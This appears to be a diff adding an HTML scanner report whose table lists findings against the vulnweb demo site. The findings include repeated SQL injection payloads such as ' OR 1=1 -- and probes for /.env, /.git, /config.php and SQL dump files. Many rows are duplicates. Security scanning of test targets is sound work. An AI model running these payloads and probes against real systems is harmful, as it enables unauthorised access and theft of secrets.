+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.git</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/.env</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Security Misconfiguration</td>
+                        <td>/config.php</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1' --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1 --</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic='</td>
+                        <td>SQL Injection</td>
+                        <td>' OR '1'='1</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/dump.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/dump.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/dump.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/dump.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/dump.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/dump.sql</td>
+                        <td>GET</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/artists.php?artist=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/listproducts.php?cat=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/backup.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                    <tr>
+                        <td>http://testphp.vulnweb.com/product.php?pic=/</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>/database.sql</td>
+                        <td>POST</td>
+                    </tr>
+                    
+                </tbody>
+            </table>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+        <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.11.3/js/jquery.dataTables.js"></script>
+        <script>
+            $(document).ready(function() {
+                $('#info-table').DataTable();
+                $('#ports-table').DataTable();
+                $('#vuln-table').DataTable();
+            });
+        </script>
+    </body>
+    </html>
+    
